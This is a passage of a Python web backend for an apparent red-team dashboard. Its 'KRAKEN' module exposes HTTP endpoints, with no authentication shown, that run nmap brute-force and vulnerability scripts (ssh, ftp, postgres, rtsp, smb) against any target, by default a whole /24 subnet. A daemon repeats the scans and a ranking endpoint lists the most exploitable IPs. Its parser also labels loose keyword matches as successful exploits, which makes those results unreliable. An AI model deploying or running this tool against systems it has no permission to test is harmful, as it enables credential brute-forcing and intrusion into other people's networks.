    """Alias de /api/v2/reports/generate sin el prefijo /v2/ (asi lo llama ExportPanel.tsx)."""
    return await v2_generate_report(request)

@app.post("/api/export")
async def compat_export_post(request: Request):
    try:
        body = await request.json()
    except:
        body = {}
    if body.get("format") == "csv":
        return await compat_export_csv()
    return await compat_export_json()



# ═════════════════════════════════════════════════════════════════════════════
import sqlite3
# =====================================================
# KRAKEN v4.0 — NSE Exploit Scanner
# =====================================================
KRAKEN_DB = BASE / "data" / "kraken_v4.db"

KRAKEN_NSE_SCRIPTS = [
    "ssh-brute", "ftp-anon", "ftp-brute",
    "smb-os-discovery", "smb-enum-shares", "smb-vuln-*",
    "http-auth-finder", "http-vuln-*",
    "rtsp-url-brute", "mysql-empty-password",
    "pgsql-brute", "redis-info",
    "rdp-vuln-ms12-020", "snmp-info",
]

KRAKEN_PORTS = "21,22,23,25,80,110,139,143,443,445,554,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017"

_kraken_running = False

def _kraken_init_db():
    KRAKEN_DB.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(KRAKEN_DB))
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS hosts (ip TEXT PRIMARY KEY, last_seen TEXT, os TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS exploits (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, port INTEGER, service TEXT, vulnerability TEXT, cve TEXT, attempted_at TEXT, success INTEGER DEFAULT 0, output TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS scan_log (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, started_at TEXT, hosts_found INTEGER, exploits_found INTEGER)")
    conn.commit()
    conn.close()

def _kraken_parse_xml(xml_data: str):
    import xml.etree.ElementTree as ET
    if not xml_data:
        return []
    try:
        root = ET.fromstring(xml_data)
    except ET.ParseError:
        return []
    hosts = []
    for host in root.findall('host'):
        addr = host.find('address')
        if addr is None:
            continue
        ip = addr.get('addr', 'unknown')
        status = host.find('status')
        if status is None or status.get('state') != 'up':
            continue
        os_elem = host.find('os/osmatch')
        os_name = os_elem.get('name') if os_elem is not None else 'Unknown'
        host_data = {"ip": ip, "os": os_name, "exploits": []}
        for port in host.findall('ports/port'):
            port_id = port.get('portid')
            service = port.find('service')
            service_name = service.get('name') if service is not None else 'unknown'
            for script in port.findall('script'):
                script_id = script.get('id')
                output = script.get('output', '')
                keywords = ['VULNERABLE', 'password', 'credentials', 'anonymous', 'Null', 'brute', 'weak', 'empty password', 'default']
                found = any(k.lower() in output.lower() for k in keywords)
                if found:
                    cve_match = re.search(r'(CVE-\d{4}-\d{4,7})', output)
                    cve = cve_match.group(1) if cve_match else 'N/A'
                    host_data['exploits'].append({
                        'port': int(port_id), 'service': service_name,
                        'script': script_id, 'vulnerability': output[:200],
                        'cve': cve, 'success': 1
                    })
        if host_data['exploits']:
            hosts.append(host_data)
    return hosts

def _kraken_save(target, hosts_data):
    conn = sqlite3.connect(str(KRAKEN_DB))
    c = conn.cursor()
    total = 0
    for host in hosts_data:
        ip = host['ip']
        c.execute("INSERT OR REPLACE INTO hosts (ip, last_seen, os) VALUES (?, ?, ?)",
                  (ip, datetime.now().isoformat(), host['os']))
        for exp in host['exploits']:
            c.execute("INSERT INTO exploits (ip, port, service, vulnerability, cve, attempted_at, success, output) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                      (ip, exp['port'], exp['service'], exp['vulnerability'], exp['cve'],
                       datetime.now().isoformat(), exp['success'], exp['vulnerability']))
            if exp['success']:
                total += 1
    c.execute("INSERT INTO scan_log (target, started_at, hosts_found, exploits_found) VALUES (?, ?, ?, ?)",
              (target, datetime.now().isoformat(), len(hosts_data), total))
    conn.commit()
    conn.close()
    return total

def _kraken_scan_sync(target: str):
    scripts_str = ','.join(KRAKEN_NSE_SCRIPTS)
    cmd = ['nmap', '-sV', '--script', scripts_str, '-p', KRAKEN_PORTS, '-oX', '-', target]  # -O quitado: requiere root, abortaba el scan completo en Termux sin privilegios
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=180)
        if proc.returncode != 0:
            return None, err[:200] if err else 'nmap error'
        return out, None
    except FileNotFoundError:
        return None, 'nmap no instalado. Instala con: pkg install nmap'
    except subprocess.TimeoutExpired:
        proc.kill()
        return None, 'Timeout (180s)'
    except Exception as e:
        return None, str(e)

@app.get("/api/kraken/scan")
async def kraken_scan(target: str = "192.168.1.0/24"):
    """Ejecuta escaneo NSE contra un target."""
    _kraken_init_db()
    loop = asyncio.get_event_loop()
    xml_data, error = await loop.run_in_executor(None, _kraken_scan_sync, target)
    if error:
        return JSONResponse({"status": "error", "error": error}, status_code=503)
    hosts = _kraken_parse_xml(xml_data)
    total = _kraken_save(target, hosts)
    return {"status": "ok", "target": target, "hosts_found": len(hosts),
            "exploits_found": total, "hosts": hosts}

@app.get("/api/kraken/results")
async def kraken_results(limit: int = 50):
    """Devuelve resultados almacenados."""
    _kraken_init_db()
    conn = sqlite3.connect(str(KRAKEN_DB))
    c = conn.cursor()
    c.execute("SELECT ip, port, service, vulnerability, cve, success, attempted_at FROM exploits ORDER BY attempted_at DESC LIMIT ?", (limit,))
    exploits = [{"ip": r[0], "port": r[1], "service": r[2], "vulnerability": r[3], "cve": r[4], "success": bool(r[5]), "attempted_at": r[6]} for r in c.fetchall()]
    c.execute("SELECT ip, last_seen, os FROM hosts ORDER BY last_seen DESC")
    hosts = [{"ip": r[0], "last_seen": r[1], "os": r[2]} for r in c.fetchall()]
    c.execute("SELECT target, started_at, hosts_found, exploits_found FROM scan_log ORDER BY started_at DESC LIMIT 20")
    scans = [{"target": r[0], "started_at": r[1], "hosts_found": r[2], "exploits_found": r[3]} for r in c.fetchall()]
    conn.close()
    return {"exploits": exploits, "hosts": hosts, "scans": scans}

@app.get("/api/kraken/priorities")
async def kraken_priorities():
    """IPs priorizadas por numero de exploits exitosos."""
    _kraken_init_db()
    conn = sqlite3.connect(str(KRAKEN_DB))
    c = conn.cursor()
    c.execute("SELECT ip, COUNT(*) as cnt, GROUP_CONCAT(DISTINCT service) as services FROM exploits WHERE success=1 GROUP BY ip ORDER BY cnt DESC LIMIT 10")
    priorities = [{"ip": r[0], "exploit_count": r[1], "services": r[2]} for r in c.fetchall()]
    conn.close()
    return {"priorities": priorities}

@app.get("/api/kraken/scripts")
async def kraken_scripts():
    """Lista de scripts NSE configurados."""
    return {"scripts": KRAKEN_NSE_SCRIPTS, "ports": KRAKEN_PORTS}

@app.post("/api/kraken/daemon/start")
async def kraken_daemon_start(target: str = "192.168.1.0/24", interval: int = 3600):
    """Inicia el daemon de escaneo periodico."""
    global _kraken_running
    if _kraken_running:
        return JSONResponse({"status": "already_running", "target": target}, status_code=409)
    _kraken_running = True
    def _daemon_loop():
        global _kraken_running
        _kraken_init_db()
        while _kraken_running:
            xml, err = _kraken_scan_sync(target)
            if xml:
                hosts = _kraken_parse_xml(xml)
                _kraken_save(target, hosts)
            import time as _t
            for _ in range(interval // 10):
                if not _kraken_running:
                    break
                _t.sleep(10)
    import threading
    t = threading.Thread(target=_daemon_loop, daemon=True)
    t.start()
    return {"status": "started", "target": target, "interval": interval}

@app.post("/api/kraken/daemon/stop")
async def kraken_daemon_stop():
    """Detiene el daemon."""
    global _kraken_running
    _kraken_running = False
    return {"status": "stopped"}

@app.get("/api/kraken/daemon/status")
async def kraken_daemon_status():
    """Estado del daemon."""
    return {"running": _kraken_running}


#  FRONTEND ESTÁTICO — SPA
# ═════════════════════════════════════════════════════════════════════════════

if DIST.exists() and DIST.is_dir():
    assets_dir = DIST / "assets"
    if assets_dir.exists():
        app.mount("/assets", StaticFiles(directory=assets_dir), name="assets")

    @app.get("/{full_path:path}")
    async def spa_fallback(full_path: str):
        if not full_path:
            index = DIST / "index.html"
            return FileResponse(index) if index.exists() else JSONResponse({"error": "dist/ empty"}, status_code=404)
        # NUNCA servir el SPA para rutas API — devuelve 404 JSON
        # Si empieza con un prefijo conocido de API/backend, no servir el SPA.
        # El catch-all está registrado antes que muchas rutas API, asi que
        # si no excluimos estas, las captura y devuelve 404 JSON.
        if full_path.startswith(("api/", "canary/", "ws", "motor/", "hls/")):
            return JSONResponse({"error": "not found"}, status_code=404)
        if full_path.startswith("assets/"):
            candidate = DIST / full_path
            if candidate.exists() and candidate.is_file():
                return FileResponse(candidate)
            return JSONResponse({"error": "not found"}, status_code=404)
        candidate = DIST / full_path
        if candidate.exists() and candidate.is_file():
            return FileResponse(candidate)
        index = DIST / "index.html"
        return FileResponse(index) if index.exists() else JSONResponse({"error": "dist/index.html missing"}, status_code=404)
else:
    @app.get("/{full_path:path}")
    async def no_dist_fallback(full_path: str):
        if full_path.startswith(("api/", "canary/", "ws", "health", "motor/", "hls/")):
            return JSONResponse({"error": "not found"}, status_code=404)
        return JSONResponse({"status": "ok", "backend": "red-team-tauri-unified",
                            "dist_built": False, "hint": f"cd tauri-frontend && npm run build (esperado: {DIST})"})


# ═════════════════════════════════════════════════════════════════════════════
#  MAIN — debe ir al FINAL para que todos los @app endpoints se registren
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import uvicorn
    import socket as _socket
    host = os.environ.get("HOST", "0.0.0.0")
    port = int(os.environ.get("PORT", "8001"))

    # GUARDIA ANTI-ZOMBIE: si ya hay algo escuchando en este puerto (un
    # proceso viejo que "pkill" no logro matar a tiempo), NO arrancar un
    # segundo proceso encima. Dos backends vivos en el mismo puerto
    # producen 401 al azar segun cual atienda cada request -> paneles
    # "rotos" de forma intermitente e imposible de diagnosticar a ojo.
    _probe = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    _probe.settimeout(0.5)
    try:
        _probe.connect(("127.0.0.1", port))
        print(f"[FATAL] Ya hay un proceso escuchando en el puerto {port}.", flush=True)
        print(f"[FATAL] Mata todos los procesos viejos antes de arrancar uno nuevo:", flush=True)
        print(f"[FATAL]   pkill -9 -f dashboard_server.py", flush=True)
        print(f"[FATAL] Si Termux esta cerrado y el puerto sigue ocupado, cierra la app", flush=True)
        print(f"[FATAL] Termux por completo (quitala de apps recientes) y reintenta.", flush=True)
        raise SystemExit(1)
    except (ConnectionRefusedError, OSError):
        pass  # puerto libre, seguir normal
    finally:
        _probe.close()
    print("═" * 60, flush=True)
    print(f"  RED-TEAM-TAURI · Unified Dashboard Backend v3.0", flush=True)
    print(f"  → Escuchando en  http://{host}:{port}", flush=True)
    print(f"  → Frontend dist/ {'OK' if DIST.exists() else 'FALTA'}: {DIST}", flush=True)
    print(f"  → WebSocket:     ws://{host}:{port}/ws", flush=True)
    print(f"  → psutil: {'OK' if HAS_PSUTIL else 'NOT AVAILABLE'}", flush=True)
    print(f"  → geo_intel: {'OK' if _GEO_INTEL_OK else 'NOT AVAILABLE'}", flush=True)
    print(f"  → Sin mocks. Sin dummy data. Solo datos reales.", flush=True)
    print(f"  → ARTO AI: {'OK' if _ARTO_OK else 'NOT AVAILABLE'}", flush=True)
    print(f"  → LEVIATHAN: {'OK' if _LEVIATHAN_OK else 'NOT AVAILABLE'}", flush=True)
    _seed_v2_if_empty()
    print("═" * 60, flush=True)
    uvicorn.run(app, host=host, port=port, log_level="info")